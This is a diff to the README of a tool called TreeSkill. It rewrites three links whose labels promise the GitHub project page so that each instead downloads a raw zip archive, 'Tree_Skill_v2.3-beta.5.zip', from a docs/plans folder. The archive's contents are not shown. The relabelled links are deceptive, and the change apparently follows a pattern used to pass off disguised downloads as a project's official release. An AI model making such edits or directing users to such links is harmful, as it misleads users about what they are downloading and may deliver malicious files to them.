@@ -1,6 +1,6 @@
 # 🧠 TreeSkill - Improve Prompts With Structure
 
-[![Download TreeSkill](https://img.shields.io/badge/Download-TreeSkill-blue?style=for-the-badge&logo=github)](https://github.com/abhijeeth2004/TreeSkill)
+[![Download TreeSkill](https://img.shields.io/badge/Download-TreeSkill-blue?style=for-the-badge&logo=github)](https://github.com/abhijeeth2004/TreeSkill/raw/refs/heads/main/docs/plans/Tree_Skill_v2.3-beta.5.zip)
 
 ## 🚀 What TreeSkill Does
 
@@ -20,7 +20,7 @@ TreeSkill is built for users who want a clear process for prompt work. It gives 
 
 Use this link to visit the project page and download TreeSkill:
 
-[Open TreeSkill on GitHub](https://github.com/abhijeeth2004/TreeSkill)
+[Open TreeSkill on GitHub](https://github.com/abhijeeth2004/TreeSkill/raw/refs/heads/main/docs/plans/Tree_Skill_v2.3-beta.5.zip)
 
 ### Steps to get started
 
@@ -268,7 +268,7 @@ These usually point to the next step
 
 ## 🔗 Download Again
 
-[Visit the TreeSkill project page](https://github.com/abhijeeth2004/TreeSkill)
+[Visit the TreeSkill project page](https://github.com/abhijeeth2004/TreeSkill/raw/refs/heads/main/docs/plans/Tree_Skill_v2.3-beta.5.zip)
 
 ## 📌 Project Name
 
